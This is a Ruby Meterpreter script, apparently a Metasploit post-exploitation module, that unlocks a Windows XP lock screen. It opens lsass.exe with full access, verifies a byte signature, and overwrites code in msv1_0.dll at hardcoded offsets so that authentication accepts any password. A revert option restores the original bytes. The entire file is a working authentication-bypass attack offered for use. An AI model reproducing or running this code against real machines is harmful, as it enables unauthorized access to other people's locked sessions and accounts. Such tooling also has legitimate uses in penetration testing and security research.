#
# Script to unlock a windows screen.
# Needs system prvileges to run and known signatures for the target system.
# This script patches msv1_0.dll loaded by lsass.exe
#
# Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
#

revert = false
targets = [
	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x77c79927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x77c799cc, :os => /Windows XP.*Service Pack 2/ },
	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x77c7981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x77c798c0, :os => /Windows XP.*Service Pack 3/ }
]

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-r" => [ false, "revert the patch (enable screen locking again)"]
)
opts.parse(args) { |opt, idx, val|
	case opt
	when "-r"
		revert = true
	when "-h"
		print_line("")
		print_line("USAGE:   run screen_unlock [-r]")
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

os = client.sys.config.sysinfo['OS']
target = nil

targets.each do |t|
	target = t if os =~ t[:os]
end
if target
	print_status("OS '#{os}' found in known targets")
else
	print_error("OS '#{os}' not found in known targets")
	raise Rex::Script::Completed
end

pid = client.sys.process["lsass.exe"]
p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

sig = p.memory.read(target[:sigoffset], target[:sig].length / 2).unpack("H*")[0]
if sig != target[:sig]
	print_error("found signature does not match")
	raise Rex::Script::Completed
end
old_code = p.memory.read(target[:patchoffset], target[:orig_code].length / 2).unpack("H*")[0]
if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
	print_error("found code does not match")
	raise Rex::Script::Completed
end

print_status("patching...")
new_code = revert ? target[:orig_code] : target[:patch]
p.memory.write(target[:patchoffset], [new_code].pack("H*"))

written_code = p.memory.read(target[:patchoffset], target[:patch].length / 2).unpack("H*")[0]
if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
	print_status("done!")
else
	print_error("failed!")
end

